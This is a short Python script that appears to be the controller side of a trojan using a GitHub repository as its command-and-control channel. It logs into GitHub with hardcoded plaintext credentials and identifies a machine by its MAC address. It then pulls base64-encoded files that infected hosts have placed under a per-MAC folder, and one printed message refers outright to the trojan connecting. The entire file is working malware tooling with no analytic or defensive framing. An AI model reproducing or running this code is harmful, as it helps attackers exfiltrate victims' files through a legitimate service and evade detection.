
import base64
import socket
import wmi 
import os 
import stat
from github3 import *


def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    #print(repo)
    branch = repo.branch("master")
    return gh, repo, branch

def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")



def downloadFilesFromGit(filename,rep):
	m=network()
	if rep.contents("data/"+str(m)+"/"+filename) == None :
#	init "mac"
		print "dont have "+filename+"... please wait for trojan connecting..."
		return "error"

	con = rep.contents("data/"+str(m)+"/"+filename)
	binstr = base64.decodestring(str(con.content))
	print len(binstr)
	filename=filename.split('\\')[-1]
	
	fileHandle = open(filename, 'wb' ) 
	fileHandle.write (binstr )  
	fileHandle.close() 
#	rep.update_file("data/"+str(m)+"/doc/doc.txt", "upload dir", searchFileDir(), sha)
	print "download ok"

def run(path):
	gh, repo, branch=connect_to_github()
	downloadFilesFromGit(path,repo)
